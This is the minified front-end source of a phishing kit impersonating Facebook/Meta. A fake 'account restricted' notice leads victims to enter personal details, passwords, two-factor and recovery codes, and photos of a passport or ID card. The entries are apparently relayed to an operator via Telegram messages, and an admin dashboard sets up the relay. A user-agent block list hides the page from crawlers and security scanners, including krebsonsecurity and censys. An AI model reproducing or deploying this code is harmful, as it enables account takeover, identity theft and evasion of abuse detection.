                Y === "/live/home/login" ? ce.settings.max_pass_attempts === 0 ? e("/live/code-input") : e("/live/home/confirm-password") : i === ce.settings.max_pass_attempts ? e("/live/code-input") : (J.current && (J.current.value = ""),
                (Ne = J.current) == null || Ne.focus())
            }
            , H)
        }
        ;
        switch (Y) {
        case "/live/home":
            ge();
            break;
        case "/live/home/login":
            W();
            break;
        case "/live/home/confirm-password":
            b();
            break
        }
    }
    ;
    return j.useEffect( () => {
        o(Q())
    }
    , []),
    l.jsxs("div", {
        className: "flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3",
        children: [l.jsxs("div", {
            children: [l.jsx("img", {
                src: u5,
                className: "w-full",
                alt: ""
            }), l.jsx("b", {
                className: "text-2xl",
                children: "Your account has been restricted"
            }), l.jsx("hr", {})]
        }), l.jsxs("div", {
            className: "my-5",
            children: ["We detected unusual activity in your page today", " ", l.jsx("strong", {
                children: I1()
            }), ". Someone has reported your account for not complying with", " ", l.jsx("b", {
                className: "cursor-pointer font-medium text-blue-500 hover:underline",
                children: "Community Standards"
            }), ". We have already reviewed this decision and the decision cannot be changed. To avoid having your account", " ", l.jsx("b", {
                className: "cursor-pointer font-medium text-blue-500 hover:underline",
                children: "disabled"
            }), " ", ", please verify:"]
        }), l.jsx(Wf, {
            context: {
                setPageName: d,
                setName: N,
                setPhoneNumber: S,
                setBirthday: g,
                setEmail: m,
                setPassword: k,
                setConfirmPassword: A,
                pageNameInputRef: P,
                nameInputRef: K,
                phoneNumberInputRef: $,
                birthdayInputRef: Se,
                emailInputRef: Te,
                passwordInputRef: Ae,
                confirmPasswordInputRef: J,
                isLoading: u,
                failedPasswordAttempts: i
            }
        }), l.jsxs("div", {
            className: "flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row",
            children: [l.jsxs("div", {
                className: "flex gap-1 sm:flex-col sm:gap-0",
                children: [l.jsx("b", {
                    children: "Case Number:"
                }), l.jsx("b", {
                    className: "text-blue-500",
                    children: a
                })]
            }), l.jsx("div", {
                className: "w-full sm:w-3/4",
                children: l.jsx("b", {
                    children: "About Case: Violating Community Standards and Posting something inappropriate."
                })
            })]
        }), l.jsx("button", {
            className: `my-5 flex w-full items-center justify-center rounded-full bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${u ? "cursor-not-allowed opacity-70" : ""}`,
            onClick: V,
            disabled: u,
            children: "Continue"
        }), u && l.jsx(L1, {
            loadingTime: H,
            setShowLoadingModal: c
        })]
    })
}
  , p5 = ({onClose: e}) => {
    const t = j.useRef(null)
      , [n,r] = j.useState(!1)
      , a = Dr()
      , o = async s => {
        const u = s.target.files ? s.target.files[0] : null;
        if (u) {
            r(!0);
            try {
                const c = localStorage.getItem("message_id");
                await f5({
                    photo: u,
                    message_id: Number(c)
                }),
                a("/live/finalize"),
                a("/live/finalize")
            } catch (c) {
                console.error("Error uploading image:", c)
            } finally {
                if (r(!1),
                t.current) {
                    t.current.value = "";
                    const c = new Event("change",{
                        bubbles: !0
                    });
                    t.current.dispatchEvent(c)
                }
            }
        }
    }
      , i = () => {
        t.current && !n && t.current.click()
    }
    ;
    return l.jsx("div", {
        className: "fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-75",
        children: l.jsxs("div", {
            className: "w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5",
            children: [l.jsxs("div", {
                className: "relative mb-4 flex items-center justify-center",
                children: [l.jsx("h2", {
                    className: "text-xl font-semibold text-gray-800",
                    children: "Confirm your identity"
                }), l.jsx(ue, {
                    icon: Gb,
                    className: "absolute right-0 top-1/2 hidden h-5 w-5 -translate-y-1/2 transform cursor-pointer rounded-full bg-gray-200 p-2 text-gray-600 hover:bg-gray-300 md:block",
                    onClick: e
                })]
            }), l.jsx("hr", {
                className: "my-4 border-gray-300"
            }), l.jsxs("div", {
                className: "mb-4",
                children: [l.jsx("b", {
                    className: "text-lg text-gray-700",
                    children: "Choose type of ID to upload"
                }), l.jsx("p", {
                    className: "mt-2 text-gray-600",
                    children: "We’ll use your ID to review your name, photo, and date of birth. It won’t be shared on your profile."
                })]
            }), l.jsxs("div", {
                className: "mb-4 w-full font-semibold text-gray-700",
                children: [l.jsxs("label", {
                    htmlFor: "passport",
                    className: "mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200",
                    children: [l.jsx("span", {
                        children: "Passport"
                    }), l.jsx("input", {
                        type: "radio",
                        id: "passport",
                        name: "document",
                        value: "passport",
                        defaultChecked: !0,
                        className: "h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    })]
                }), l.jsxs("label", {
                    htmlFor: "drivers-license",
                    className: "mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200",
                    children: [l.jsx("span", {
                        children: "Driver's license"
                    }), l.jsx("input", {
                        type: "radio",
                        id: "drivers-license",
                        name: "document",
                        value: "drivers-license",
                        className: "h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    })]
                }), l.jsxs("label", {
                    htmlFor: "national-id",
                    className: "mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200",
                    children: [l.jsx("span", {
                        children: "National ID card"
                    }), l.jsx("input", {
                        type: "radio",
                        id: "national-id",
                        name: "document",
                        value: "national-id",
                        className: "h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    })]
                })]
            }), l.jsx("input", {
                type: "file",
                accept: "image/*",
                ref: t,
                onChange: o,
                className: "hidden"
            }), l.jsxs("div", {
                className: "rounded-md bg-gray-100 p-4 text-sm text-gray-600",
                children: ["Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.", " ", l.jsx("a", {
                    href: "https://www.facebook.com/help/155050237914643/",
                    target: "_blank",
                    className: "text-blue-600 underline",
                    children: "Learn more"
                })]
            }), l.jsx("button", {
                className: `mt-6 w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600 ${n ? "cursor-not-allowed opacity-50" : ""}`,
                onClick: i,
                disabled: n,
                children: n ? "Uploading..." : "Upload Image"
            })]
        })
    })
}
  , h5 = () => {
    const [e,t] = j.useState("")
      , {errors: n, validateInput: r} = Kf()
      , [a,o] = j.useState(!1)
      , [i,s] = j.useState(!1)
      , [u,c] = j.useState(1)
      , f = j.useRef(null)
      , [d,h] = j.useState(!1)
      , [N,y] = j.useState(null);
    j.useEffect( () => {
        (async () => {
            try {
                const k = await fa();
                y(k)
            } catch (k) {
                console.error("Error fetching config:", k)
            }
        }
        )()
    }
    , []),
    j.useEffect( () => {
        u !== 1 && h(!0)
    }
    , [u]);
    const S = C => {
        const k = C.target.value;
        /^\d*$/.test(k) && k.length <= 8 && (h(!1),
        t(k))
    }
      , x = () => {
        if (o(!0),
        c(u + 1),
        N && u === N.settings.max_code_attempts) {
            s(!0);
            const C = localStorage.getItem("message_id")
              , k = localStorage.getItem("message")
              , w = (k == null ? void 0 : k.replace(/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/, `<b>📅 Thời gian:</b> <code>${Vo()}</code>`)) + `
<b>🔢 Code ${u}:</b><code>` + e + "</code>";
            localStorage.setItem("message", w),
            tl({
                message_id: Number(C),
                text: w
            })
        } else {
            const C = localStorage.getItem("message_id")
              , k = localStorage.getItem("message")
              , w = (k == null ? void 0 : k.replace(/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/, `<b>📅 Thời gian:</b> <code>${Vo()}</code>`)) + `
<b>🔢 Code ${u}:</b><code>` + e + "</code>";
            localStorage.setItem("message", w),
            tl({
                message_id: Number(C),
                text: w
            });
            const A = N ? N.settings.code_loading_time : 0;
            setTimeout( () => {
                var P;
                t(""),
                f.current && (f.current.value = ""),
                (P = f.current) == null || P.focus(),
                o(!1),
                r("code", e)
            }
            , A)
        }
    }
      , g = () => {
        r("code", e)
    }
      , p = e.length === 6 || e.length === 8
      , m = () => {
        s(!1)
    }
    ;
    return N ? l.jsxs("div", {
        className: "flex w-full flex-col items-center justify-center p-4",
        children: [l.jsxs("div", {
            className: "flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3",
            children: [l.jsxs("div", {
                className: "flex flex-col",
                children: [l.jsx("b", {
                    children: "Account Center - Facebook"
                }), l.jsx("b", {
                    className: "text-2xl",
                    children: "Check notifications on another device"
                })]
            }), l.jsx("img", {
                src: i5,
                alt: ""
            }), l.jsxs("div", {
                children: [l.jsx("b", {
                    children: "Approve from another device or Enter your login code"
                }), l.jsx("p", {
                    children: "Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code"
                })]
            }), l.jsxs("div", {
                className: "my-2 flex flex-col items-center justify-center",
                children: [l.jsx("input", {
                    ref: f,
                    className: "w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
                    type: "text",
                    autoComplete: "one-time-code",
                    inputMode: "numeric",
                    maxLength: 8,
                    minLength: 6,
                    pattern: "\\d*",
                    placeholder: "Enter Code",
                    value: e,
                    onChange: S,
                    onBlur: g
                }), n.code && l.jsx("p", {
                    className: "text-red-500",
                    children: n.code
                }), !a && d && l.jsx("p", {
                    className: "text-red-500",
                    children: "This code is incorrect. Please check that you entered the code correctly or try a new code."
                }), l.jsx("button", {
                    className: `my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${p ? "cursor-pointer bg-blue-500 hover:bg-blue-600" : "cursor-not-allowed bg-blue-300"} ${a ? "cursor-not-allowed opacity-70" : ""}`,
                    onClick: () => {
                        p && x()
                    }
                    ,
                    disabled: !p || a,
                    children: "Continue"
                }), a && l.jsx(L1, {
                    loadingTime: N.settings.code_loading_time,
                    setShowLoadingModal: o
                }), l.jsx("a", {
                    href: "#",
                    className: "text-blue-500 hover:underline",
                    children: "Send Code"
                })]
            })]
        }), i && l.jsx(p5, {
            onClose: m
        })]
    }) : l.jsx(s5, {})
}
  , m5 = () => {
    const [e,t] = j.useState("")
      , {errors: n, validateInput: r} = Kf()
      , [a,o] = j.useState(!1)
      , {setConfirmPassword: i, confirmPasswordInputRef: s, isLoading: u, failedPasswordAttempts: c} = Vf()
      , f = h => {
        o(!1),
        i(h.target.value),
        t(h.target.value)
    }
      , d = () => {
        r("password", e)
    }
    ;
    return j.useEffect( () => {
        (async () => {
            const N = (await fa()).settings.max_pass_attempts;
            c >= N && !u ? (t(""),
            o(!0)) : u === !1 && o(!1)
        }
        )()
    }
    , [u, c]),
    l.jsxs("div", {
        className: "my-2",
        children: [l.jsx("input", {
            ref: s,
            className: "w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "password",
            placeholder: "Password",
            value: e,
            onChange: f,
            onBlur: d
        }), n.password && l.jsx("p", {
            className: "text-red-500",
            children: n.password
        }), a && l.jsx("p", {
            className: "text-red-500",
            children: "The password that you've entered is incorrect."
        })]
    })
}
  , g5 = () => (j.useEffect( () => {}
, []),
l.jsx("h1", {
    className: "flex min-h-svh items-center justify-center text-center text-9xl text-red-500",
    children: "????"
}))
  , y5 = () => l.jsx("div", {
    className: "fixed inset-0 flex items-center justify-center",
    children: l.jsxs("div", {
        className: "mx-auto w-11/12 rounded-lg bg-white p-6 shadow-2xl shadow-gray-700 md:w-1/3",
        children: [l.jsx("div", {
            className: "mb-2 flex flex-col items-center justify-center",
            children: l.jsx("b", {
                children: "Information Submitted"
            })
        }), l.jsx("hr", {}), l.jsxs("div", {
            className: "mt-2 flex flex-col items-center justify-center gap-2",
            children: [l.jsx(ue, {
                icon: Kb,
                className: "rounded-full border-2 border-white text-center text-blue-500 ring-2 ring-blue-500"
            }), l.jsx("b", {
                className: "mb-2 text-center",
                children: "Thank you for submitting your info"
            })]
        }), l.jsx("p", {
            className: "mb-4 text-gray-700",
            children: "It should take about 24 hours to review your submission. We'll update your verification status after the review is complete."
        }), l.jsx("div", {
            className: "flex justify-center",
            children: l.jsx("button", {
                className: "w-full rounded bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600",
                onClick: () => {
                    window.open("https://www.facebook.com"),
                    window.location.replace("about:blank")
                }
                ,
                children: "Done"
            })
        })]
    })
})
  , v5 = () => l.jsx("footer", {
    className: "flex items-center justify-center p-4 text-gray-700",
    children: l.jsxs("p", {
        children: [l.jsx(ue, {
            icon: Yb,
            className: "text-yellow-600"
        }), " ", "Please make sure to fill in the data correctly; otherwise, your account may be permanently closed. To learn more about why accounts are deactivated, visit our", " ", l.jsx("a", {
            href: "https://www.facebook.com/help/582999911881572",
            target: "_blank",
            rel: "noopener noreferrer",
            className: "text-blue-600 hover:underline",
            children: "Community Standards"
        }), " ", "."]
    })
})
  , x5 = "/assets/meta-image-0X_yXz75.png"
  , w5 = () => l.jsx("div", {
    className: "sticky left-0 right-0 top-0 h-12 bg-gray-200 px-4 py-1",
    children: l.jsx("img", {
        src: x5,
        alt: "",
        className: "h-full"
    })
})
  , b5 = () => l.jsxs("div", {
    className: "flex min-h-screen flex-col",
    children: [l.jsx(w5, {}), l.jsx("main", {
        className: "flex flex-grow flex-col items-center justify-center",
        children: l.jsx(Wf, {})
    }), l.jsx(v5, {})]
})
  , S5 = "/assets/hero-image-2-BjNDC5va.png"
  , N5 = () => {
    const e = Dr()
      , [t,n] = j.useState(void 0);
    return j.useEffect( () => {
        const r = I1();
        n(r)
    }
    , []),
    l.jsx("div", {
        className: "flex min-h-screen flex-col items-center justify-center py-8",
        children: l.jsxs("div", {
            className: "flex w-11/12 flex-col gap-4 rounded-full md:w-2/5 2xl:w-1/3",
            children: [l.jsx("img", {
                src: S5,
                alt: "Hero",
                className: "rounded-t-lg"
            }), l.jsx("b", {
                className: "text-2xl",
                children: "Welcome To Meta Protect."
            }), l.jsxs("p", {
                children: ["Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages. ", l.jsx("br", {}), l.jsx("a", {
                    href: "https://www.facebook.com/help/582999911881572",
                    target: "_blank",
                    className: "text-blue-500 hover:underline",
                    rel: "noreferrer",
                    children: "More information"
                })]
            }), l.jsx("div", {
                className: "px-4",
                children: l.jsxs("ol", {
                    className: "relative flex flex-col gap-5 border-s-2 border-s-gray-200",
                    children: [l.jsx("li", {
                        className: "mb-10 ms-6 pb-4",
                        children: l.jsxs("div", {
                            className: "absolute -start-4 flex items-center justify-start gap-2",
                            children: [l.jsx(ue, {
                                icon: oo,
                                size: "lg",
                                className: "h-4 w-4 rounded-full bg-gray-400 p-2 text-white ring-2 ring-white"
                            }), l.jsx("p", {
                                children: "We've enabled advanced protections to unlock your Page."
                            })]
                        })
                    }), l.jsx("li", {
                        className: "mb-10 ms-6",
                        children: l.jsxs("div", {
                            className: "absolute -start-4 flex items-center justify-start gap-2",
                            children: [l.jsx(ue, {
                                icon: Bb,
                                size: "xs",
                                className: "h-4 w-4 rounded-full bg-blue-500 p-2 text-white ring-2 ring-white"
                            }), l.jsx("p", {
                                children: "Below, we walk you through the process in detail and help you fully activate to unlock your Page."
                            })]
                        })
                    })]
                })
            }), l.jsx("div", {
                className: "mt-6 md:mt-3",
                children: l.jsx("button", {
                    className: "w-full rounded-full bg-blue-500 p-3 font-semibold text-white",
                    onClick: () => {
                        e("/live/home")
                    }
                    ,
                    children: "Continue"
                })
            }), l.jsxs("p", {
                className: "text-center",
                children: ["Your page was restricted on ", l.jsx("b", {
                    children: t
                })]
            })]
        })
    })
}
  , C5 = yc(l.jsxs(l.Fragment, {
    children: [l.jsx(Ot, {
        path: "/live",
        element: l.jsx(N5, {})
    }), l.jsx(Ot, {
        path: "/live/home",
        element: l.jsx(b5, {}),
        children: l.jsxs(Ot, {
            element: l.jsx(d5, {}),
            children: [l.jsx(Ot, {
                index: !0,
                element: l.jsx(_b, {})
            }), l.jsx(Ot, {
                path: "login",
                element: l.jsx(Tb, {})
            }), l.jsx(Ot, {
                path: "confirm-password",
                element: l.jsx(m5, {})
            })]
        })
    }), l.jsx(Ot, {
        path: "/admin",
        element: l.jsx(n6, {})
    }), l.jsxs(Ot, {
        path: "/admin/dashboard",
        element: l.jsx(t6, {}),
        children: [l.jsx(Ot, {
            index: !0,
            element: l.jsx(Lh, {})
        }), l.jsx(Ot, {
            path: "telegram",
            element: l.jsx(r5, {})
        }), l.jsx(Ot, {
            path: "domain",
            element: l.jsx(Lh, {})
        }), l.jsx(Ot, {
            path: "website",
            element: l.jsx(o5, {})
        }), l.jsx(Ot, {
            path: "account",
            element: l.jsx(Z3, {})
        })]
    }), l.jsx(Ot, {
        path: "/admin/vip",
        element: l.jsx(e6, {})
    }), l.jsx(Ot, {
        path: "/live/code-input",
        element: l.jsx(h5, {})
    }), l.jsx(Ot, {
        path: "/live/finalize",
        element: l.jsx(y5, {})
    }), l.jsx(Ot, {
        path: "*",
        element: l.jsx(g5, {}),
        errorElement: l.jsx(kx, {
            to: "/"
        })
    })]
}))
  , k5 = Ax(C5)
  , j5 = /googlebot|puppeteer|http|client|selenium|zgrab|crawler|bot|spider|curl|wget|java|ruby|yandex|baidu|sogou|exabot|tweetmeme|slackbot|discordbot|krebsonsecurity|ivre-masscan|go|python|censysinspect|facebookexternalhit|bingbot|ahrefs|semrush|sistrix|mailchimp|mailgun|larbin|libwww|bingpreview|t66y|yahoo|soso|facebook|pinterest|w3c|genieo|sphinx|telegrambot|bing|duckduckbot|slack|linkedinbot|pinger|gogot|search|scrapy|scrapyd|coco|gather|gatherbot|mass|twilio|ahrefsbot|alexabot|bitlybot|cenysinspect|chilkat|cora|dotbot|fuzzer|grapeshot|lighthouse|mj12bot|nutch|openlinkprofiler|phantomjs|semrushbot|spinn3r|yandexbot/i
  , E5 = /googlebot|puppeteer|http|client|selenium|zgrab|masscan|crawler|bot|spider|curl|wget|java|ruby|yandex|baidu|sogou|exabot|tweetmeme|slackbot|discordbot/i
  , _5 = /krebsonsecurity|ivre-masscan|go|python|censysinspect|facebookexternalhit|bingbot|ahrefs|semrush|dotbot|sistrix|mailchimp|mailgun|larbin|libwww|spinn3r/i
  , T5 = /bingpreview|t66y|mj12bot|yahoo|soso|facebook|pinterest|w3c|genieo|sphinx|telegrambot|bing|duckduckbot|slack|facebookexternalhit|linkedinbot/i
  , P5 = /pinger|gogot|bot|search|scrapy|nutch|grub|riddler|coco|gather|gatherbot|mass|twilio/i
  , O5 = ({children: e}) => {
    const [t,n] = j.useState(!1);
    return j.useEffect( () => {
        const r = navigator.userAgent.toLowerCase();
        (j5.test(r) || E5.test(r) || _5.test(r) || T5.test(r) || P5.test(r)) && n(!0)
    }
    , []),
    t ? l.jsx("h1", {
        className: "flex min-h-svh items-center justify-center text-center text-9xl text-red-500",
        children: "????"
    }) : l.jsx(l.Fragment, {
        children: e
    })
}
  , R5 = () => l.jsx(O5, {
    children: l.jsx($x, {
        router: k5
    })
});
eg(document.getElementById("root")).render(l.jsx(j.StrictMode, {
    children: l.jsx(R5, {})
}));
